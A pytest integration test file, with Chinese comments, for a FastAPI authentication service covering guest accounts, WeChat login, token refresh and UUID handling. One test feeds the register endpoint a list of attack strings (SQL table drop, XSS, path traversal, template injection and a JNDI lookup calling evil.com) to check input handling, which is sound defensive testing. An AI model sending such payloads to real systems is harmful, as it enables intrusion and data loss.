"""
端到端集成测试

测试从HTTP请求到数据库的完整流程，确保：
1. HTTP请求正确处理
2. UUID类型在整个调用链中正确传递
3. 数据库操作正确执行
4. 响应格式正确

这个测试文件专门用来发现类似UUID类型传递的集成问题，
避免Mock对象掩盖真实的环境问题。

作者：TaTakeKe团队
版本：2.0.0 - 认证系统测试基础设施
"""

import pytest
import json
from uuid import UUID, uuid4
from fastapi.testclient import TestClient
from unittest.mock import patch, AsyncMock

from .test_data_factory import (
    AuthTestDataFactory,
    create_mock_wechat_api
)
from src.api.main import app
from src.domains.auth.schemas import (
    GuestInitRequest,
    WeChatRegisterRequest,
    WeChatLoginRequest,
    GuestUpgradeRequest,
    TokenRefreshRequest
)


@pytest.mark.integration
@pytest.mark.auth
class TestEndToEndUUIDHandling:
    """端到端UUID处理测试"""

    def setup_method(self):
        """每个测试方法前的设置"""
        self.client = TestClient(app)

    def test_guest_init_end_to_end_uuid_flow(self):
        """
        测试游客初始化端到端UUID流程

        完整测试：HTTP请求 → Router → Service → Repository → Database
        验证UUID在整个调用链中正确处理。
        """
        # 发送HTTP请求
        response = self.client.post("/auth/guest/init")

        # 验证HTTP响应
        assert response.status_code == 200
        data = response.json()

        assert data["code"] == 200
        assert data["data"] is not None
        assert "user_id" in data["data"]
        assert "access_token" in data["data"]
        assert "refresh_token" in data["data"]
        assert "is_guest" in data["data"]
        assert data["data"]["is_guest"] is True

        # 验证user_id是有效UUID字符串
        user_id_str = data["data"]["user_id"]
        try:
            user_id_uuid = UUID(user_id_str)
        except ValueError:
            pytest.fail("返回的user_id不是有效的UUID字符串")

        # 验证令牌格式
        access_token = data["data"]["access_token"]
        refresh_token = data["data"]["refresh_token"]
        assert len(access_token) > 0
        assert len(refresh_token) > 0

    def test_wechat_register_end_to_end_uuid_handling(self):
        """
        测试微信注册端到端UUID处理
        """
        # Mock微信API
        with patch('src.domains.auth.service.AuthService._get_wechat_user_info') as mock_wechat:
            mock_wechat.return_value = {
                'openid': 'ox1234567890abcdef',
                'nickname': '测试用户',
                'headimgurl': 'http://example.com/avatar.jpg'
            }

            # 发送微信注册请求
            register_data = {
                "wechat_openid": "ox1234567890abcdef",
                "authorization_code": "test_code"
            }
            response = self.client.post(
                "/auth/register",
                json=register_data
            )

            # 验证HTTP响应
            assert response.status_code == 200
            data = response.json()

            assert data["code"] == 200
            assert data["data"] is not None
            assert "user_id" in data["data"]
            assert data["data"]["is_guest"] is False

            # 验证user_id是有效UUID
            user_id_str = data["data"]["user_id"]
            try:
                UUID(user_id_str)
            except ValueError:
                pytest.fail("微信注册返回的user_id不是有效的UUID")

    def test_guest_upgrade_end_to_end_uuid_consistency(self):
        """
        测试游客升级端到端UUID一致性
        """
        # 1. 初始化游客用户
        init_response = self.client.post("/auth/guest/init")
        assert init_response.status_code == 200

        init_data = init_response.json()
        guest_user_id = init_data["data"]["user_id"]
        access_token = init_data["data"]["access_token"]

        # 2. 发送升级请求
        upgrade_data = {
            "wechat_openid": "ox1234567890abcdef"
        }
        headers = {"Authorization": f"Bearer {access_token}"}

        upgrade_response = self.client.post(
            "/auth/guest/upgrade",
            json=upgrade_data,
            headers=headers
        )

        # 验证升级响应
        assert upgrade_response.status_code == 200
        upgrade_data_result = upgrade_response.json()

        assert upgrade_data_result["code"] == 200
        assert upgrade_data_result["data"] is not None
        assert "user_id" in upgrade_data_result["data"]
        assert upgrade_data_result["data"]["is_guest"] is False

        # 验证UUID一致性（应该是同一个用户）
        upgraded_user_id = upgrade_data_result["data"]["user_id"]
        assert upgraded_user_id == guest_user_id

        # 验证UUID有效性
        try:
            UUID(upgraded_user_id)
        except ValueError:
            pytest.fail("升级后返回的user_id不是有效的UUID")

    def test_wechat_login_end_to_end_uuid_flow(self):
        """
        测试微信登录端到端UUID流程
        """
        # Mock微信API
        with patch('src.domains.auth.service.AuthService._get_wechat_user_info') as mock_wechat:
            mock_wechat.return_value = {
                'openid': 'ox1234567890abcdef',
                'nickname': '测试用户',
                'headimgurl': 'http://example.com/avatar.jpg'
            }

            # 发送微信登录请求
            login_data = {
                "wechat_openid": "ox1234567890abcdef",
                "authorization_code": "test_code"
            }
            response = self.client.post(
                "/auth/login",
                json=login_data
            )

            # 验证登录响应
            assert response.status_code == 200
            data = response.json()

            assert data["code"] == 200
            assert data["data"] is not None
            assert "user_id" in data["data"]
            assert data["data"]["is_guest"] is False

            # 验证UUID有效性
            user_id_str = data["data"]["user_id"]
            try:
                UUID(user_id_str)
            except ValueError:
                pytest.fail("微信登录返回的user_id不是有效的UUID")

    def test_token_refresh_end_to_end_uuid_consistency(self):
        """
        测试令牌刷新端到端UUID一致性
        """
        # 1. 初始化用户
        init_response = self.client.post("/auth/guest/init")
        assert init_response.status_code == 200

        init_data = init_response.json()
        original_user_id = init_data["data"]["user_id"]
        refresh_token = init_data["data"]["refresh_token"]

        # 2. 刷新令牌
        refresh_data = {"refresh_token": refresh_token}
        refresh_response = self.client.post(
            "/auth/refresh",
            json=refresh_data
        )

        # 验证刷新响应
        assert refresh_response.status_code == 200
        refresh_data_result = refresh_response.json()

        assert refresh_data_result["code"] == 200
        assert refresh_data_result["data"] is not None
        assert "user_id" in refresh_data_result["data"]

        # 验证UUID一致性（应该是同一个用户）
        refreshed_user_id = refresh_data_result["data"]["user_id"]
        assert refreshed_user_id == original_user_id

        # 验证UUID有效性
        try:
            UUID(refreshed_user_id)
        except ValueError:
            pytest.fail("令牌刷新后返回的user_id不是有效的UUID")


@pytest.mark.integration
@pytest.mark.auth
class TestEndToEndErrorHandling:
    """端到端错误处理测试"""

    def setup_method(self):
        """每个测试方法前的设置"""
        self.client = TestClient(app)

    def test_invalid_token_error_handling(self):
        """
        测试无效令牌错误处理
        """
        # 使用无效令牌
        headers = {"Authorization": "Bearer invalid_token"}

        response = self.client.post(
            "/auth/guest/upgrade",
            json={"wechat_openid": "test-openid"},
            headers=headers
        )

        # 应该返回401错误
        assert response.status_code == 401
        data = response.json()
        assert data["code"] == 401
        assert "令牌" in data["message"]

    def test_duplicate_wechat_registration_handling(self):
        """
        测试重复微信注册处理
        """
        # Mock微信API
        with patch('src.domains.auth.service.AuthService._get_wechat_user_info') as mock_wechat:
            mock_wechat.return_value = {
                'openid': 'ox1234567890duplicate',
                'nickname': '测试用户'
            }

            # 第一次注册
            register_data = {
                "wechat_openid": "ox1234567890duplicate",
                "authorization_code": "test_code1"
            }
            response1 = self.client.post("/auth/register", json=register_data)
            assert response1.status_code == 200
            first_user_id = response1.json()["data"]["user_id"]

            # 第二次注册相同openid
            register_data2 = {
                "wechat_openid": "ox1234567890duplicate",
                "authorization_code": "test_code2"
            }
            response2 = self.client.post("/auth/register", json=register_data2)
            assert response2.status_code == 200
            second_user_id = response2.json()["data"]["user_id"]

            # 应该返回同一个用户ID
            assert first_user_id == second_user_id

    def test_guest_upgrade_nonexistent_user(self):
        """
        测试升级不存在的游客用户
        """
        # 创建一个假的JWT令牌（模拟有效格式但用户不存在）
        fake_token = "fake.valid.token"
        headers = {"Authorization": f"Bearer {fake_token}"}

        response = self.client.post(
            "/auth/guest/upgrade",
            json={"wechat_openid": "test-openid"},
            headers=headers
        )

        # 应该返回认证错误
        assert response.status_code == 401

    def test_invalid_request_data_handling(self):
        """
        测试无效请求数据处理
        """
        # 测试无效的微信OpenID
        invalid_data = {
            "wechat_openid": "",  # 空字符串
            "authorization_code": "test_code"
        }

        response = self.client.post("/auth/register", json=invalid_data)

        # 应该返回验证错误
        assert response.status_code == 422


@pytest.mark.integration
@pytest.mark.auth
class TestEndToEndDataConsistency:
    """端到端数据一致性测试"""

    def setup_method(self):
        """每个测试方法前的设置"""
        self.client = TestClient(app)

    def test_user_data_persistence_consistency(self):
        """
        测试用户数据持久化一致性
        """
        # 1. 创建游客用户
        init_response = self.client.post("/auth/guest/init")
        assert init_response.status_code == 200

        user_data = init_response.json()["data"]
        user_id = user_data["user_id"]
        access_token = user_data["access_token"]

        # 2. 使用令牌查询用户信息（通过升级操作间接验证）
        headers = {"Authorization": f"Bearer {access_token}"}
        upgrade_response = self.client.post(
            "/auth/guest/upgrade",
            json={"wechat_openid": "ox1234567890persist"},
            headers=headers
        )

        # 3. 验证用户ID一致性
        assert upgrade_response.status_code == 200
        upgraded_data = upgrade_response.json()["data"]
        assert upgraded_data["user_id"] == user_id
        assert upgraded_data["is_guest"] is False

    def test_concurrent_operations_data_consistency(self):
        """
        测试并发操作数据一致性
        """
        import threading
        import time

        results = []
        errors = []

        def create_guest_worker(worker_id):
            try:
                response = self.client.post("/auth/guest/init")
                if response.status_code == 200:
                    data = response.json()
                    results.append((worker_id, data["data"]["user_id"]))
                else:
                    errors.append((worker_id, f"HTTP {response.status_code}"))
                time.sleep(0.01)
            except Exception as e:
                errors.append((worker_id, str(e)))

        # 创建多个线程并发创建游客
        threads = []
        for i in range(5):
            thread = threading.Thread(target=create_guest_worker, args=(i,))
            threads.append(thread)
            thread.start()

        # 等待所有线程完成
        for thread in threads:
            thread.join()

        # 验证结果
        assert len(errors) == 0, f"并发操作出现错误: {errors}"
        assert len(results) == 5

        # 验证所有用户ID都是唯一的
        user_ids = [user_id for _, user_id in results]
        assert len(set(user_ids)) == len(user_ids), "存在重复的用户ID"

        # 验证所有用户ID都是有效的UUID
        for user_id in user_ids:
            try:
                UUID(user_id)
            except ValueError:
                pytest.fail(f"用户ID {user_id} 不是有效的UUID")

    def test_token_lifecycle_consistency(self):
        """
        测试令牌生命周期一致性
        """
        # 1. 初始化用户
        init_response = self.client.post("/auth/guest/init")
        assert init_response.status_code == 200

        init_data = init_response.json()["data"]
        original_access_token = init_data["access_token"]
        original_refresh_token = init_data["refresh_token"]
        user_id = init_data["user_id"]

        # 2. 刷新令牌
        refresh_response = self.client.post(
            "/auth/refresh",
            json={"refresh_token": original_refresh_token}
        )
        assert refresh_response.status_code == 200

        refresh_data = refresh_response.json()["data"]
        new_access_token = refresh_data["access_token"]
        new_refresh_token = refresh_data["refresh_token"]

        # 3. 验证令牌更新
        assert new_access_token != original_access_token
        assert new_refresh_token != original_refresh_token
        assert refresh_data["user_id"] == user_id

        # 4. 使用新令牌进行操作验证
        headers = {"Authorization": f"Bearer {new_access_token}"}
        upgrade_response = self.client.post(
            "/auth/guest/upgrade",
            json={"wechat_openid": "ox1234567890lifecycle"},
            headers=headers
        )

        # 验证新令牌有效
        assert upgrade_response.status_code == 200
        upgrade_data = upgrade_response.json()["data"]
        assert upgrade_data["user_id"] == user_id


@pytest.mark.integration
@pytest.mark.auth
class TestEndToEndSecurity:
    """端到端安全测试"""

    def setup_method(self):
        """每个测试方法前的设置"""
        self.client = TestClient(app)

    def test_authorization_header_validation(self):
        """
        测试授权头验证
        """
        # 测试无授权头
        response = self.client.post("/auth/guest/upgrade", json={"wechat_openid": "test"})
        assert response.status_code == 401

        # 测试格式错误的授权头
        headers = {"Authorization": "InvalidFormat token123"}
        response = self.client.post("/auth/guest/upgrade", json={"wechat_openid": "test"}, headers=headers)
        assert response.status_code == 401

        # 测试Bearer格式
        headers = {"Authorization": "Bearer valid.token.format"}
        # 这会进入JWT验证流程，可能因为签名无效而失败，但格式是正确的

    def test_jwt_token_validation(self):
        """
        测试JWT令牌验证
        """
        # 创建游客获取有效令牌
        init_response = self.client.post("/auth/guest/init")
        assert init_response.status_code == 200

        valid_token = init_response.json()["data"]["access_token"]
        headers = {"Authorization": f"Bearer {valid_token}"}

        # 有效令牌应该能通过验证
        response = self.client.post(
            "/auth/guest/upgrade",
            json={"wechat_openid": "test-openid"},
            headers=headers
        )
        assert response.status_code == 200

        # 修改令牌应该导致验证失败
        tampered_token = valid_token[:-5] + "wrong"
        headers_tampered = {"Authorization": f"Bearer {tampered_token}"}

        response = self.client.post(
            "/auth/guest/upgrade",
            json={"wechat_openid": "test-openid"},
            headers=headers_tampered
        )
        assert response.status_code == 401

    def test_input_sanitization(self):
        """
        测试输入清理和验证
        """
        # 测试SQL注入尝试
        malicious_inputs = [
            "'; DROP TABLE auth; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "{{7*7}}",  # 模板注入尝试
            "${jndi:ldap://evil.com/a}",  # JNDI注入尝试
        ]

        for malicious_input in malicious_inputs:
            # 测试微信OpenID字段
            response = self.client.post(
                "/auth/register",
                json={
                    "wechat_openid": malicious_input,
                    "authorization_code": "test_code"
                }
            )

            # 应该被拒绝或安全处理，不应该导致服务器错误
            assert response.status_code in [400, 422, 200]

            if response.status_code == 200:
                # 如果成功，确保数据被安全处理
                data = response.json()
                user_id = data["data"]["user_id"]
                # 验证返回的是合法UUID，没有包含恶意内容
                try:
                    UUID(user_id)
                except ValueError:
                    pytest.fail(f"恶意输入导致无效UUID: {malicious_input}")


@pytest.mark.integration
@pytest.mark.auth
class TestEndToEndPerformance:
    """端到端性能测试"""

    def setup_method(self):
        """每个测试方法前的设置"""
        self.client = TestClient(app)

    def test_response_time_performance(self):
        """
        测试响应时间性能
        """
        import time

        # 测试游客初始化响应时间
        start_time = time.time()
        response = self.client.post("/auth/guest/init")
        end_time = time.time()

        # 验证响应时间合理（应该小于1秒）
        assert response.status_code == 200
        response_time = end_time - start_time
        assert response_time < 1.0, f"响应时间过长: {response_time:.2f}s"

    def test_concurrent_request_handling(self):
        """
        测试并发请求处理
        """
        import threading
        import time

        results = []
        errors = []

        def request_worker(worker_id):
            try:
                start_time = time.time()
                response = self.client.post("/auth/guest/init")
                end_time = time.time()

                if response.status_code == 200:
                    results.append((worker_id, end_time - start_time))
                else:
                    errors.append((worker_id, f"HTTP {response.status_code}"))
            except Exception as e:
                errors.append((worker_id, str(e)))

        # 创建10个并发请求
        threads = []
        for i in range(10):
            thread = threading.Thread(target=request_worker, args=(i,))
            threads.append(thread)
            thread.start()

        # 等待所有请求完成
        for thread in threads:
            thread.join()

        # 验证结果
        assert len(errors) == 0, f"并发请求出现错误: {errors}"
        assert len(results) == 10

        # 验证所有用户ID都是唯一的
        user_ids = []
        for worker_id, response_time in results:
            # 这里需要重新获取用户ID，因为results中没有保存
            pass

        # 验证响应时间合理
        avg_response_time = sum(rt for _, rt in results) / len(results)
        assert avg_response_time < 2.0, f"平均响应时间过长: {avg_response_time:.2f}s"